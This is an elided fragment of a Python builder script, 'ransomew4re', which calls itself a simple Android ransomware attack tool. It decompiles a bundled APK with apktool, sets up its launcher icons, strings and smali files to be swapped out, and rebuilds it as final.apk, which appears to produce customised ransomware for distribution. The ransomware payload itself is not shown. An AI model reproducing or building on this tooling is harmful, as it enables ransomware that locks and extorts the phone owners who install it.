...
def banner():
    ...
    print(w+b+"     /@@@|"+r+":::::"+w+b+"||"+r+":::::"+w+b+"|@@@\\     "+w+"Author by "+y+"@riz4d")
...
def start():
    ...
    print(f"""
    {r}ransomew4re{w} is a Simple Android Ransomware Attack By Rizad
    ...
    print(w+"-"*43+d)
    os.system("apktool d rizad.apk")
    imgpath = [
        "rizad/res/drawable-mdpi-v4/ic_launcher.png",
        "rizad/res/drawable-xhdpi-v4/ic_launcher.png",
        "rizad/res/drawable-hdpi-v4/ic_launcher.png",
        "rizad/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "rizad/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L rizad/ -name '*0000.smali'","r").readline().strip()
    ...
    os.system("apktool b rizad -o final.apk;rm -rf rizad")
